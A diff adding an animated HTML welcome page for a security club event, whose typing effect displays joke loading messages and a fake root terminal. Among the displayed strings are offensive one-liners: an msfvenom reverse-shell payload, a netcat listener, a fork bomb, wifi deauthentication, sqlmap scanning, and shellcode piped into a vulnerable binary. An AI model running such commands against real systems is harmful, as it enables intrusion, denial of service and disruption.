@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Shellmates Welcome Day 2k19</title>
+	<link rel="stylesheet" type="text/css" href="animate.css">
+	<script src="typeit.min.js"></script>
+</head>
+<body style=margin:0 onload="for(s=window.screen,w=q.width=s.width,h=q.height=s.height,m=Math.random,p=[],i=0;i<256;p[i++]=1);setInterval('9Style=\'rgba(0,0,0,.05)\'9Rect(0,0,w,h)9Style=\'#0F0\';p.map(function(v,i){9Text(String.fromCharCode(Math.round(Math.random()) + 48),i*10,v);p[i]=v>758+m()*1e4?0:v+10})'.split(9).join(';q.getContext(\'2d\').fill'),33)">
+	<canvas id=q style="position: absolute; top: 0; left: 0; z-index: -200; height: 100%; width: 100%"></canvas>
+	 <audio autoplay loop preload><source src="cybercity.mp3" type="audio/mpeg"></audio> 
+	<div style="z-index: 100">
+		<h1 id="heading" style="font-family: Courier New; margin-top: 150px; color: white"></h1>
+		<img id="logo" src="./logo.svg" alt="Shellmates Logo" class="heart">
+		<h1 style="text-align: left">
+			<span id="prompt" style="font-family: Courier New; margin-top: 50px; color: red;">root@shellmates</span><span id="prompt" style="font-family: Courier New; margin-top: 50px; color: white">:</span><span id="prompt" style="font-family: Courier New; margin-top: 50px; color: blue">~</span><span id="prompt" style="font-family: Courier New; margin-top: 50px; color: white">#</span>
+			<span id="cmd" style="font-family: Courier New; margin-top: 50px; color: white"></span>
+		</h1>
+		<script>
+		new TypeIt('#heading', {
+			loop: true,
+			speed: 100,
+			typeSpeed: 180,
+			backSpeed: 60,
+			breakLines: false,
+	  		strings: ["https://www.youtube.com/watch?v=dQw4w9WgXcQ", "this is so sad alexa, play despacito pls", "There’s a 100% chance you will see this.", "Locating the required gigapixels to render...", "Spinning up the hamster...", "Shovelling coal into the server...", "Programming the flux capacitor", "Testing RAM..............OK", "Testing CPU..............OK", "Testing Primary Disk.....OK", "Testing Patience.......FAIL", "USER ERROR: OUT OF PATIENCE!", "I'd tell you a UDP joke, but I don't know if you'd get it...", '640K ought to be enough for anybody', 'the architects are still drafting', 'the bits are breeding', "we're building the buildings as fast as we can", "hacking as a lifestyle", 'would you prefer chicken, steak, or tofu?', 'pay no attention to the man behind the curtain', "ensuring dankest memes", 'No, let me think. 00010F24...', 'Wait a minute.', 'Where the hell was that?', 'Yeah, found: 00020EFF.', "Damn it, we've lost it again. Searching......", 'Wanna play chess?', 'and enjoy the elevator music', 'while the little elves draw your map', 'a few bits tried to escape, but we caught them', 'and dream of faster computers', 'would you like fries with that?', 'checking the gravitational constant in your locale', 'go ahead -- hold your breath', "at least you're not on hold", 'hum something loud while others stare', "you're not in Kansas any more", 'the server is powered by a lemon and two electrodes', 'we love you just the way you are', 'while a larger software vendor in Seattle takes over the world', "we're testing your patience", 'as if you had any other choice', 'take a moment to sign up for our lovely prizes', "don't think of purple hippos", 'follow the white rabbit', "why don't you order a sandwich?", 'while the satellite moves into position', 'the bits are flowing slowly today', "dig on the 'X' for buried treasure... ARRR!", "it's still faster than you could draw it"],
+		}).go();
+
+		new TypeIt('#cmd', {
+			loop: true,
+			speed: 100,
+			typeSpeed: 180,
+			backSpeed: 60,
+			breakLines: false,
+	  		strings: ["echo '/* where there is a shell, there is a way */'", "nmap -p- -sC -sV 10.10.10.137", "tshark -r pingpong.pcapng -T fields -e data 'icmp && ip.dst == 192.168.1.107' | cut -b 17-48 | while read buff; do printf $buff; done | xxd -r -p > elf && chmod +x elf && ./elf && rm -f elf", "nc -lvp 1337", "gdb -q vuln", "python3 exploit.py", "msfvenom -p linux/x64/shell_reverse_tcp -f elf -o revshell LHOST=10.10.10.164 LPORT=1337", "python -m SimpleHTTPServer 80", ":(){ :|:& };:", "airmon-ng start wlan0", "airodump-ng --bssid de:ad:00:00:be:ef -c 6 -w output wlan0mon", "aireplay-ng --deauth 0 -a de:ad:00:00:be:ef -c ca:fe:00:00:ba:be wlan0mon", "python -c \"print 'A'*500\" | ./vuln", "rabin2 -I vuln", "rot13(){ echo $1 | tr A-Za-z N-ZA-Mn-za-m; }", "sqlmap --url 'https://thiscouldbeyourwebsite.com/?id=1' -p id --dbs", "ROPgagdet --binary ropme", "rasm2 -ax86.nasm -b64 'xor rax, rax; ret'", "gobuster dir -u https://targetwebsite.com/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k", "(python -c \"print '\\x90'*256 + '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80'\"; cat -) | ./vuln", "msfconsole -q"],
+		}).go();
+		</script>
+	</div>
+</body>
+</html>
